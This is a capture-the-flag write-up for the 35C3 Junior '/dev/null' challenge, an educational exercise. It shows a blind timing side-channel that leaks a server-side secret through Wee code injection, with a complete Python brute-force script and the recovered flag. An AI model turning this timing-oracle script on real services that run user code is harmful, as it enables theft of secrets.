# 35C3 Junior CTF – /dev/null

* **Category:** Misc  
* **Points:** 116 (variable)

## Challenge

> We're not the first but definitely the latest to offer dev-null-as-a-
> service. Pretty sure we're also the first to offer Wee-piped-to-dev-null-as-
> a-service[WPtDNaaS]. (We don't pipe anything, but the users don't care).
> This service is more useful than most blockchains (old joke, we know).
> Anyway this novel endpoint takes input at /wee/dev/null and returns nothing.  
>  
> http://35.207.189.79/  
>  
> Difficulty Estimate: Hard  
>  
> ===============================================  
>  
> Good coders should learn one new language every year.  
>  
> InfoSec folks are even used to learn one new language for every new problem
> they face (YMMV).  
>  
> If you have not picked up a new challenge in 2018, you're in for a treat.  
>  
> We took the new and upcoming Wee programming language from paperbots.io. Big
> shout-out to Mario Zechner (@badlogicgames) at this point.  
>  
> Some cool Projects can be created in Wee, like: this, this and that.  
>  
> Since we already know Java, though, we ported the server (Server.java and
> Paperbots.java) to Python (WIP) and constantly add awesome functionality.
> Get the new open-sourced server at /pyserver/server.py.  
>  
> Anything unrelated to the new server is left unchanged from commit
> dd059961cbc2b551f81afce6a6177fcf61133292 at badlogics paperbot github
> (mirrored up to this commit here).  
>  
> We even added new features to this better server, like server-side Wee
> evaluation!  
>  
> To make server-side Wee the language of the future, we already implemented
> awesome runtime functions. To make sure our VM is 100% safe and secure,
> there are also assertion functions in server-side Wee that you don't have to
> be concerned about.

## Solution

Analyzing `http://35.207.189.79/pyserver/server.py` two interesting methods
can be discovered.

```Python  
def runwee(wee: string) -> string:  
   print("{}: running {}".format(request.remote_addr, wee))  
   result = check_output(  
       ["ts-node", '--cacheDirectory', os.path.join(WEE_PATH, "__cache__"),  
        os.path.join(WEE_PATH, WEETERPRETER), wee], shell=False, stderr=STDOUT, timeout=WEE_TIMEOUT,  
       cwd=WEE_PATH).decode("utf-8")  
   print("{}: result: {}".format(request.remote_addr, result))  
   return result

@app.route("/wee/dev/null", methods=["POST"])  
def dev_null():  
   json = request.get_json(force=True)  
   wee = json["code"]  
   wee = """  
   var DEV_NULL: string = '{}'  
   {}  
   """.format(DEV_NULL, wee)  
   _ = runwee(wee)  
   return "GONE"  
```

`DEV_NULL` variable contains the flag and is manipulated accessing to
`/wee/dev/null` endpoint via POST operation. The variable is put into a *Wee*
script, together with an input provided by the user via JSON, that is executed
server side.

Unfortunately the execution is completely "blind", because no output is
returned to the user, only a constant value (i.e. `GONE`).

Furthermore, the `runwee` method, which executes the passed *Wee* script,
contains a timeout (i.e. 5 secs, that you will discover after few analysis).

A creative way to exfiltrate data is via a *side-channel attack based on
timing*, using a check that allows to "guess" the complete string one char at
a time, i.e. something like *blind SQL injection* attacks.

Analyzing the documentation you could discover two useful methods:  
* `charAt`;  
* `pause`.

These could be used to craft a *Wee* script like the following.

```  
if charAt(DEV_NULL, position) == '?' then  
  pause(4500)  
end  
```

Where `position` is the char you are trying to guess and `?` is the char
candidate. If the char candidate is correct, the script will pause for 4.5
secs.

A Python script can be used to automatize the operation.

```Python  
import requests  
import time  
import json

url = "http://35.207.189.79/wee/dev/null"  
data_structure = """{{ "code": {} }}"""  
data_content = """if charAt(DEV_NULL, {}) == '{}' then  
  pause(4500)  
end"""  
chars =
list("_1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM")  
response_time_target = 4.0

try:  
  
  f = 0  
  flag = ""  
  fast_answers = 0  
  while fast_answers < len(chars):

     best_char = " "  
     best_response_time = 0.0  
     fast_answers = 0

     for c in range(len(chars)):  
        print "[*] Flag char number '{}', char '{}'.".format(f, chars[c])  
        data_content_to_send = json.dumps(data_content.format(f, chars[c]))  
        data_to_send = data_structure.format(data_content_to_send)  
        print "[*] Payload: '{}'.".format(data_to_send)  
        start = time.time()  
        response = requests.post(url, data=data_to_send)  
        end = time.time()  
        print "[*] Response: '{}'.".format(response.text)  
  
        response_time = end - start  
        print "[*] Response time is '{}'.".format(response_time)  
        if response_time >= response_time_target and response_time > best_response_time:  
           best_response_time = response_time  
           best_char = chars[c]  
           print "[*] Found char '{}'.".format(best_char)  
           break  
        elif response_time < response_time_target:  
           fast_answers+=1

     f+=1  
     flag += str(best_char)  
     print "[*] >>> Flag: '{}'. <<<".format(flag)

except KeyboardInterrupt:  
  print "[-] Interrupted!"  
```

The flag is the following.

```  
35C3_TH3_SUN_IS_TH3_SAM3_YOU_RE_OLDER  
```

Original writeup (https://github.com/m3ssap0/CTF-
Writeups/blob/master/35C3%20Junior%20CTF/dev_null/README.md).